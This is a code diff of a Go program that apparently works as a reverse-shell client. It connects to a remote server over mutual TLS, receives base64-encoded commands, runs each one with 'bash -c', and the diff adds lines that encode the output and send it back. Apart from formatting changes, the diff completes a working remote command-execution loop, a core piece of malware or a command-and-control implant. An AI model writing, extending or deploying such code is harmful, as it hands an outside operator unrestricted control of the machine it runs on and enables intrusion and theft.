@@ -50,17 +50,15 @@ func genCert(email string) string {
 	outstr := string(cmd)
 	return outstr
 
-	
 }
 func getOS(conn *tls.Conn) string {
 
 	return runtime.GOOS
 
 }
-func execInput(input string) (string, error){
+func execInput(input string) (string, error) {
 	// Remove the newline character.
 	input = strings.TrimSuffix(input, "\n")
-
 
 	cmd, err := exec.Command("bash", "-c", input).Output()
 	if err != nil {
@@ -94,20 +92,19 @@ func main() {
 	}
 	log.Println("client: handshake: ", state.HandshakeComplete)
 	log.Println("client: mutual: ", state.NegotiatedProtocolIsMutual)
-	
+
 	for {
 		buffer := make([]byte, 1024)
 		_, err := conn.Read(buffer)
 		handleError(err)
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
-		fmt.Println("$ "+string(sDec))
-		resp, err  := execInput(string(sDec))
-		// fmt.Println(resp)
-		fmt.Println(string(resp))
+		fmt.Println("$ " + string(sDec))
+		resp, err := execInput(string(sDec))
+		fmt.Println(resp)
+		time.Sleep(time.Second)
+		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
+		_, err = conn.Write([]byte(encodedResp))
 		handleError(err)
-
-		
-
 		time.Sleep(time.Second)
 	}
 }
